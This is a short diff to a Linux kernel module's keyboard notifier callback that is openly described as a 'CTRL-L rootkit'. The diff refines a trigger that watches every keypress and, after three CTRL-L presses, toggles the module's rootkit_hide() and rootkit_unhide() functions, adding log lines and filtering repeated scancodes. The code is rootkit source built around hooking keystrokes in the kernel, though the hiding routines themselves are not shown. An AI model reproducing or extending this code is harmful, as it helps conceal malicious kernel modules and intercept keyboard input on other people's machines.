@@ -59,21 +59,30 @@ int kb_cb(struct notifier_block *nblock,
 	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
 		 code, param->down, param->shift, param->value);
 
-	/* Trace only when a key is pressed down */
+	// Make sure not to double up on key-up events
 	if (!(param->down))
 		return NOTIFY_OK;
 
-	// Check for CTRL-L
+	// Check for CTRL-L x3
 	if (param->value == 0x26 && param->shift == 4) {
 		ctrll_count++;
 		if (ctrll_count > 2) {
-			pr_info("CTRL-L pressed 3 times!!!");
+			pr_info("CTRL-L pressed 3 times!!!\n");
 			if (hidden) {
+				pr_info("Unhiding CTRL-L rootkit\n");
 				rootkit_unhide();
 			}
 			else {
+				pr_info("Hiding CTRL-L rootkit\n");
 				rootkit_hide();
 			}
+			ctrll_count = 0;
+		}
+	}
+	else {
+		// holding down ctrl causes repeats of 29, also had issues here with
+		// scancodes in the 60000+ range getting picked up, filter them too
+		if (param->value != 29 && param->value < 256) {
 			ctrll_count = 0;
 		}
 	}
